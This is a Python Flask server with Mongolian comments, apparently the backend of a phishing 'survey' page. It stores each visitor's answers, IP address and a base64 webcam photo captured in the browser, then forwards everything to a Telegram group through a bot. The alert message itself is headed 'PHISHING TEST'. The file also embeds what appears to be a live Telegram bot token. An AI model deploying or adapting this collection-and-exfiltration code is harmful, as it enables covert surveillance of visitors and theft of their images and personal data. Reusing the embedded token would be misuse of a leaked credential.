# app.py - СУДАЛГАА БА ЗУРАГ ТЕЛЕГРАМ РУУ ИЛГЭЭХ БҮРЭН КОД
import requests
import base64
import os
from flask import Flask, request, jsonify, render_template

# ====================================================================
# ⚠️ 1. ТАНЫ ТОХИРГОО ⚠️
# ====================================================================
TELEGRAM_TOKEN = '8476306576:AAFIzHzOLDQR_qOKb5yn4eK6VsMmIrGdy_Q'  
# Зөв Групп Чат ID (Сөрөг тоог ашиглана)
CHAT_ID = '-5036234831'
UPLOAD_FOLDER = 'captured_images'
# ====================================================================

app = Flask(__name__)

# Зураг хадгалах хавтас үүсгэх
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# ----------------- sendPhoto ЧАДВАРТАЙ ФУНКЦ -----------------
def send_telegram_media_notification(message_text, image_filepath=None):
    """Текст болон зургийг хамт Telegram API руу илгээх функц"""
    
    # sendPhoto-д 'caption' хэрэглэнэ.
    if image_filepath and os.path.exists(image_filepath):
        TELEGRAM_PHOTO_API_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto'
        payload = {
            'chat_id': CHAT_ID, 
            'caption': message_text, 
            'parse_mode': 'Markdown'
        }
        
        # Зургийн файлыг forms data хэлбэрээр илгээх
        files = {'photo': open(image_filepath, 'rb')}
        
        try:
            response = requests.post(TELEGRAM_PHOTO_API_URL, data=payload, files=files)
            response.raise_for_status()
            print("Telegram-д зураг болон текст амжилттай илгээгдлээ.")
            return True
        except requests.exceptions.RequestException as e:
            print(f"Telegram API руу зураг илгээх алдаа: {e}")
            return False
    else:
        # Зураг байхгүй бол зөвхөн текст илгээнэ (sendMessage)
        TELEGRAM_MESSAGE_API_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        payload_text_only = {
            'chat_id': CHAT_ID, 
            'text': message_text, 
            'parse_mode': 'Markdown'
        }
        try:
            response = requests.post(TELEGRAM_MESSAGE_API_URL, json=payload_text_only)
            response.raise_for_status()
            print("Telegram-д зөвхөн текст амжилттай илгээгдлээ.")
            return True
        except requests.exceptions.RequestException as e:
            print(f"Telegram API руу зөвхөн текст илгээх алдаа: {e}")
            return False

# ----------------- Үндсэн Вэб Хаяг (Frontend-ийг үйлчлэх) -----------------
@app.route('/')
def index():
    """http://127.0.0.1:8080/ хаяг руу хандах үед templates/index.html-ийг буцаана"""
    return render_template('index.html') 

# ----------------- Өгөгдөл Хүлээн Авах API -----------------
@app.route('/api/submit-test', methods=['POST'])
def submit_test():
    data = request.json
    survey_answers = data.get('answers', {})
    image_data_url = data.get('imageData', None)
    user_ip = request.remote_addr 
    
    image_filepath = None 
    
    # 1. Зураг хадгалах хэсэг (Base64 тайлах)
    if image_data_url:
        try:
            # Base64-ээс тайлах
            header, encoded_data = image_data_url.split(',', 1) 
            decoded_image = base64.b64decode(encoded_data)
            
            # Файлын нэрийг үүсгэх
            filename = f"image_{user_ip}_{len(os.listdir(UPLOAD_FOLDER)) + 1}.jpeg"
            filepath = os.path.join(UPLOAD_FOLDER, filename)
            image_filepath = filepath
            
            # Зургийг хавтаст бичих
            with open(image_filepath, "wb") as f:
                f.write(decoded_image)
            
            print(f"Зураг хадгалагдсан: {image_filepath}")
            
        except Exception as e:
            print(f"Зураг боловсруулах алдаа: {e}")
            
    # 2. Telegram Мэдэгдэл Бэлтгэх 
    telegram_message = f"🚨 *АНХААРУУЛГА: ФИШИНГ ТЕСТ* 🚨\n"
    telegram_message += f"**IP Хаяг:** `{user_ip}`\n\n"
    
    if image_data_url:
        telegram_message += "*⚠️ Камерын зургийг авсан! (Зөвшөөрөл олгосон)*\n"
    else:
        telegram_message += "*✅ Зөвхөн судалгааг бөглөсөн (Камерт хандалт хийгээгүй эсвэл блок хийсэн)*\n"

    telegram_message += "\n*Судалгааны Хариултууд:*\n"
    for key, value in survey_answers.items():
        telegram_message += f"**{key.capitalize()}:** {value}\n"
    
    # 3. Telegram руу илгээх (Зургийн замыг дамжуулна)
    send_telegram_media_notification(telegram_message, image_filepath) 

    return jsonify({"status": "success", "message": "Мэдээллийг бүртгэсэн"}), 200

if __name__ == '__main__':
    # Сервер ажиллуулах
    app.run(port=8080, debug=True)